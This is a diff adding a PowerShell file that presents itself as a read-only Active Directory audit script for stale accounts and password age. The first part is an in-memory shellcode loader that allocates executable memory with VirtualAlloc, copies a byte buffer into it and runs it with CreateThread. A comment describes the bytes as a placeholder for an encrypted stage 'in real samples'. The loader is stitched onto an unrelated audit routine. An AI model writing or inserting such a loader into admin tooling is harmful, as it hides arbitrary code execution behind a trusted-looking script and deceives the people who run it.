@@ -1,0 +1,253 @@
+
+
+[CmdletBinding()]
+param(
+    [string]$LogPath = "$env:TEMP\loader.log"
+)
+
+$NativeCode = @"
+using System;
+using System.Runtime.InteropServices;
+
+public static class NativeMethods
+{
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
+        uint flAllocationType, uint flProtect);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
+        uint dwFreeType);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
+        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
+        uint dwCreationFlags, out uint lpThreadId);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool CloseHandle(IntPtr hObject);
+}
+"@
+
+Add-Type -TypeDefinition $NativeCode -Language CSharp
+
+# buffer placeholder: random bytes, replaces the encrypted stage in real samples
+$Buffer = [Byte[]] @(
+    0xdd, 0x57, 0x55, 0x33, 0xeb, 0x8c, 0xa0, 0x57, 0xc7, 0x99, 0x70, 0x7f, 0x38, 0xa6, 0x13, 0xc1,
+    0xe3, 0x03, 0x0a, 0x44, 0x8e, 0x85, 0xe2, 0xfb, 0xbf, 0xbc, 0x26, 0xd1, 0x86, 0x8f, 0x38, 0x43,
+    0xd5, 0xdf, 0x14, 0xcf, 0x33, 0xe3, 0x60, 0x18, 0x76, 0xb2, 0x4e, 0xed, 0x17, 0x71, 0x2d, 0x20,
+    0xc9, 0x8e, 0x99, 0xb8, 0x39, 0x82, 0xb8, 0x91, 0xa4, 0xa3, 0xef, 0xc0, 0xe2, 0x63, 0x25, 0xaf,
+    0x46, 0xfc, 0x6d, 0xa3, 0xc3, 0xcd, 0xb8, 0xe7, 0x56, 0x34, 0xdd, 0x5c, 0x7c, 0x4d, 0x77, 0xb6,
+    0xab, 0xef, 0xec, 0x60, 0x64, 0x83, 0xa6, 0xcf, 0x34, 0x61, 0x01, 0xe8, 0x68, 0xc9, 0x28, 0xe4,
+    0x6f, 0x62, 0x2e, 0xc8, 0x47, 0x1e, 0x67, 0xb5, 0x5a, 0x10, 0xae, 0x9a, 0x1a, 0xc2, 0xa3, 0x8c,
+    0xfa, 0xfd, 0x66, 0x3e, 0xd8, 0xd5, 0xa4, 0x85, 0x88, 0xb9, 0xc0, 0x43, 0x3e, 0xd9, 0xae, 0xc5,
+    0x5f, 0x82, 0x40, 0x91, 0x4a, 0x6f, 0xc7, 0xed, 0x12, 0x6a, 0x5e, 0xd6, 0xf4, 0xcd, 0xdb, 0x46,
+    0x71, 0xf4, 0x29, 0x55, 0x49, 0x13, 0x55, 0x13, 0x5c, 0x88, 0x69, 0x90, 0x92, 0xfb, 0xd9, 0x4c,
+    0xbf, 0x4e, 0x41, 0x5d, 0x94, 0xfa, 0xa9, 0xb0, 0xab, 0x23, 0x3f, 0x74, 0x9c, 0x43, 0xfe, 0x56,
+    0x80, 0xca, 0x4f, 0x3e, 0x1d, 0xda, 0x05, 0x75, 0x9e, 0x49, 0xeb, 0x65, 0xc6, 0xdc, 0x2e, 0x0a,
+    0xb8, 0x38, 0x34, 0xae, 0xfb, 0x77, 0x24, 0x30, 0xa8, 0x58, 0x6a, 0x33, 0x76, 0x5a, 0x2b, 0xae,
+    0x4d, 0xaa, 0x3f, 0x15, 0x3d, 0xc7, 0x40, 0x34, 0x93, 0xe7, 0x7c, 0xb1, 0xdf, 0x27, 0x48, 0xd9,
+    0x15, 0x92, 0x5f, 0xd9, 0xa0, 0xee, 0x5b, 0x5d, 0xa2, 0x7b, 0x42, 0xfa, 0x02, 0x33, 0xc0, 0x24,
+    0x26, 0x30, 0xb2, 0x43, 0xaa, 0x81, 0xde, 0x02, 0x36, 0xf1, 0x63, 0xb4, 0x3f, 0xeb, 0x12, 0x29,
+    0x65, 0x7b, 0x13, 0x1f, 0x95, 0xc1, 0x2f, 0xd1, 0x20, 0xc3, 0xad, 0x09, 0x37, 0x3c, 0x7d, 0x13,
+    0x78, 0xab, 0x80, 0x39, 0x3a, 0xa8, 0x27, 0xfd, 0xa9, 0x29, 0xf9, 0xde, 0x4b, 0xae, 0x09, 0x4c,
+    0xb8, 0xb3, 0xa6, 0xc5, 0xed, 0xf2, 0x02, 0x8e, 0xae, 0xf2, 0xff, 0xba, 0xbb, 0xc0, 0xc2, 0xa5,
+    0xe9, 0x85, 0x53, 0xbe, 0xb1, 0x87, 0x1d, 0x27, 0x10, 0xfa, 0xb4, 0x3b, 0xc5, 0x01, 0xec, 0xc6,
+    0xe4, 0x30, 0x86, 0x81, 0x9e, 0xb0, 0xd0, 0x45, 0xa3, 0xd5, 0x4f, 0x61, 0xf1, 0x99, 0x99, 0x78,
+    0xc8, 0x40, 0x28, 0xe7, 0x91, 0xe5, 0xe2, 0xa4, 0x6c, 0x26, 0x47, 0xa3, 0x68, 0x53, 0x8d, 0x5d,
+    0x8d, 0xc6, 0x82, 0xc8, 0xbf, 0x88, 0x96, 0xd3, 0x27, 0x1e, 0x04, 0xb9, 0x6a, 0x93, 0x18, 0x75,
+    0x79, 0x1d, 0xfb, 0x60, 0x7c, 0xda, 0x53, 0x71, 0x78, 0xe8, 0x16, 0x5a, 0x54, 0x99, 0x7b, 0x5b,
+    0x57, 0x42, 0x72, 0xac, 0x08, 0x04, 0x7d, 0xfd, 0x57, 0xa7, 0x2d, 0x2c, 0xab, 0x32, 0xb5, 0xb3,
+    0xac, 0xcb, 0xa2, 0x15, 0xfa, 0x56, 0x00, 0xa5, 0xd0, 0xb8, 0x80, 0x78, 0xee, 0xd8, 0x76, 0x6d,
+    0x05, 0x7d, 0xb0, 0x89, 0xe9, 0xbe, 0xcc, 0x38, 0xd2, 0x4c, 0x9f, 0xde, 0xbd, 0x1b, 0xa4, 0xca,
+    0xeb, 0x74, 0x61, 0xed, 0xba, 0x0c, 0x07, 0xc3, 0x0c, 0xa6, 0x36, 0x12, 0x7b, 0x73, 0xed, 0x4f,
+    0xa5, 0x3d, 0x14, 0x3d, 0xc5, 0x82, 0x4b, 0xc0, 0x52, 0x98, 0xa8, 0xdc, 0x12, 0xeb, 0xe8, 0x0d,
+    0xb0, 0x28, 0xde, 0xeb, 0x6b, 0x32, 0xed, 0x65, 0x12, 0xa1, 0x96, 0x45, 0xc8, 0xda, 0x82, 0xb8,
+    0x68, 0xed, 0x7c, 0x4c, 0xe3, 0x8e, 0x6a, 0x7b, 0x20, 0xdd, 0xeb, 0xb4, 0x8a, 0x40, 0xfc, 0x81,
+    0x4e, 0xba, 0x52, 0x07, 0xe4, 0x7d, 0x4c, 0x9d, 0x50, 0x29, 0x54, 0x89, 0x8d, 0xf4, 0xdc, 0x1e,
+    0xa1, 0xea, 0x69, 0x59, 0x6b, 0xb1, 0x89, 0x52, 0xce, 0x92, 0x71, 0xc0, 0x2d, 0x2f, 0x1d, 0x24,
+    0x19, 0xb6, 0x43, 0x04, 0x7a, 0xdb, 0x02, 0xec, 0x17, 0x04
+)
+
+$MemoryHandle = [NativeMethods]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
+if ($MemoryHandle -eq [IntPtr]::Zero) {
+    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
+    return
+}
+
+[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $MemoryHandle, $Buffer.Length)
+$ThreadId = 0
+$Thread = [NativeMethods]::CreateThread([IntPtr]::Zero, 0, $MemoryHandle, [IntPtr]::Zero, 0, [ref]$ThreadId)
+[void][NativeMethods]::WaitForSingleObject($Thread, 1463)
+[void][NativeMethods]::CloseHandle($Thread)
+
+$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
+$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
+<#
+.SYNOPSIS
+    Audits Active Directory user accounts for stale sign-ins and password age.
+.DESCRIPTION
+    Queries the configured search base, flags accounts whose last logon is older
+    than the inactivity threshold and exports the result set to CSV.
+    The script is read-only. It never modifies directory objects and can be
+    scheduled on a management host with the RSAT tools installed.
+.PARAMETER Domain
+    Used when the script runs unattended.
+.PARAMETER SearchBase
+    Defaults to the value configured for this host.
+.EXAMPLE
+    .\Invoke-ADUserAudit.ps1 -InactiveDays 90
+.NOTES
+    Author: IT Systems
+    Last updated: 2026-09-09
+#>
+
+$Domain = 'adatum.com'
+$SearchBase = 'OU=Employees,DC=adatum,DC=com'
+$ReportPath = "C:\Reports\ad-user-audit-2025-02-26.csv"
+$HtmlPath = "C:\Reports\ad-user-audit-2025-02-26.html"
+$InactiveDays = 90
+$PasswordMaxAge = 90
+$SmtpServer = 'smtp.adatum.com'
+
+$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
+
+Import-Module ActiveDirectory -ErrorAction Stop
+$LogPath = 'C:\Logs\ad-audit-2025-02-26.log'
+
+function Write-LogEntry {
+    param(
+        [Parameter(Mandatory = $true)]
+        [string]$Message,
+
+        [ValidateSet('INFO', 'WARN', 'ERROR')]
+        [string]$Level = 'INFO'
+    )
+
+    $line = "{0} [{1}] {2}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $Level, $Message
+    Add-Content -Path $LogPath -Value $line -Encoding UTF8
+    if ($Level -eq 'ERROR') {
+        Write-Host $line -ForegroundColor Red
+    }
+}
+Import-Module ActiveDirectory -ErrorAction Stop
+$properties = @('LastLogonDate', 'PasswordLastSet', 'Enabled', 'Description')
+$searchBases = @(
+    "OU=Employees,DC=adatum,DC=com"
+    "OU=ServiceAccounts,DC=adatum,DC=com"
+)
+
+$users = foreach ($base in $searchBases) {
+    Write-Verbose ("Querying {0}" -f $base)
+    Get-ADUser -Filter * -SearchBase $base -Properties $properties -ErrorAction Continue
+}
+
+$cutoff = (Get-Date).AddDays(-$InactiveDays)
+
+$stale = $users | Where-Object {
+    $_.Enabled -eq $true -and $_.LastLogonDate -ne $null -and $_.LastLogonDate -lt $cutoff
+}
+
+$pwdCutoff = (Get-Date).AddDays(-$PasswordMaxAge)
+$oldPasswords = $users | Where-Object {
+    $_.PasswordLastSet -ne $null -and $_.PasswordLastSet -lt $pwdCutoff
+}
+
+$staleCount = @($stale).Count
+$disabledCount = @($users | Where-Object { $_.Enabled -eq $false }).Count
+$oldPwdCount = @($oldPasswords).Count
+
+$groupReport = foreach ($user in @($users | Select-Object -First 50)) {
+    $groups = Get-ADPrincipalGroupMembership -Identity $user.SamAccountName -ErrorAction SilentlyContinue |
+        Where-Object { $_.Name -ne 'Domain Users' }
+    [pscustomobject]@{
+        SamAccountName = $user.SamAccountName
+        GroupCount     = @($groups).Count
+        Groups         = (@($groups | Select-Object -ExpandProperty Name) -join '; ')
+    }
+}
+
+$groupReport | Export-Csv -Path "C:\Reports\ad-user-audit-2025-02-26-groups.csv" -NoTypeInformation -Encoding UTF8
+
+$stale | Select-Object Name, SamAccountName, LastLogonDate, PasswordLastSet, Enabled | Export-Csv -Path $ReportPath -NoTypeInformation -Encoding UTF8
+
+$oldPasswords | Select-Object Name, SamAccountName, PasswordLastSet | Export-Csv -Path $ReportPath.Replace('.csv', '-passwords.csv') -NoTypeInformation
+$disabled = $users | Where-Object { $_.Enabled -eq $false }
+$disabled | Select-Object Name, SamAccountName, DistinguishedName |
+    Export-Csv -Path $ReportPath.Replace('.csv', '-disabled.csv') -NoTypeInformation -Encoding UTF8
+
+$style = @'
+<style>
+body { font-family: Tahoma; font-size: 11px; }
+table { border-collapse: collapse; width: 100%; }
+th { background: #f4f4f4; text-align: left; padding: 4px; }
+td { border-bottom: 1px solid #dddddd; padding: 4px; }
+</style>
+'@
+
+$stale |
+    Select-Object Name, SamAccountName, LastLogonDate, PasswordLastSet |
+    ConvertTo-Html -Title 'Stale AD accounts' -Head $style |
+    Set-Content -Path $HtmlPath -Encoding UTF8
+
+$summaryBody = @"
+Stale accounts : $staleCount
+Disabled       : $disabledCount
+Old passwords  : $oldPwdCount
+Report         : $ReportPath
+"@
+$MailTo = "it-ops@$Domain"
+$MailFrom = "reporting@$Domain"
+
+$mailParams = @{
+    To         = $MailTo
+    From       = $MailFrom
+    Subject    = 'AD user audit: daily summary'
+    Body       = $summaryBody
+    SmtpServer = $SmtpServer
+    Port       = 25
+    UseSsl     = $true
+}
+Send-MailMessage @mailParams
+
+Write-Host ("AD audit finished: {0} stale, {1} disabled" -f $staleCount, $disabledCount) -ForegroundColor Green
+Write-LogEntry -Message ("Audit completed for {0}" -f $Domain) -Level INFO
+
+$engine = Get-ADRootDSE -ErrorAction SilentlyContinue
+if ($engine) {
+    Write-Verbose ("Domain controller: {0}" -f $engine.dnsHostName)
+    Write-Verbose ("Default naming context: {0}" -f $engine.defaultNamingContext)
+}
+
+$sampleStale = $stale | Sort-Object -Property LastLogonDate | Select-Object -First 10
+$sampleStale | Format-Table Name, SamAccountName, LastLogonDate -AutoSize
+
+$pwdPolicy = Get-ADDefaultDomainPasswordPolicy -ErrorAction SilentlyContinue
+if ($pwdPolicy) {
+    Write-Verbose ("Domain password age: {0} days" -f $pwdPolicy.MaxPasswordAge.Days)
+}
+
+$byOu = $users | Group-Object -Property DistinguishedName |
+    Sort-Object -Property Count -Descending | Select-Object -First 5
+$byOu | Format-Table -AutoSize | Out-String | Write-Verbose
+
+$neverLoggedOn = $users | Where-Object { $_.LastLogonDate -eq $null }
+if (@($neverLoggedOn).Count -gt 0) {
+    Write-Warning ("{0} accounts have never signed in" -f @($neverLoggedOn).Count)
+}
+
+$transcript = Join-Path $env:TEMP ("ad-audit-" + (Get-Date -Format 'yyyyMMdd-HHmmss') + ".log")
+Start-Transcript -Path $transcript -Append | Out-Null
+Write-Verbose ("Transcript: {0}" -f $transcript)
+
+$expiringSoon = $users | Where-Object {
+    $_.PasswordLastSet -ne $null -and $_.PasswordLastSet -lt (Get-Date).AddDays(-($PasswordMaxAge - 14))
+}
+Write-Verbose ("Password changes due: {0}" -f @($expiringSoon).Count)
+
+$ous = Get-ADOrganizationalUnit -Filter * -ErrorAction SilentlyContinue |
+    Select-Object -First 5 -Property Name, DistinguishedName
+$ous | Format-Table -AutoSize
